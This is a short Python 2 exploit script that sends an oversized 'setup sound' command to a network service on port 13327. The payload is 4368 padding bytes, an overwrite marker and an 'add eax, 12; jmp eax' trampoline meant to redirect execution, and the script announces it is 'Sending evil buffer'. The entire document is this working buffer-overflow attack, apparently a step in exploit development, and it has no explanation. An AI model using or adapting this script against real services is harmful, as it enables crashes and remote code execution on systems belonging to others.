#!/usr/bin/python
import socket

host='127.0.0.1'
jmp_eax = "\x83\xc0\x0c\xff\xe0\x90\x90"
print 'eax::::' + jmp_eax 
crash= "\x41"*4368 + "B"*4 + jmp_eax
# buffer = "\x11(setup sound " + crash + "\x90\x00#"
buffer = "\x11(setup sound " + crash + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
print crash
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent !"

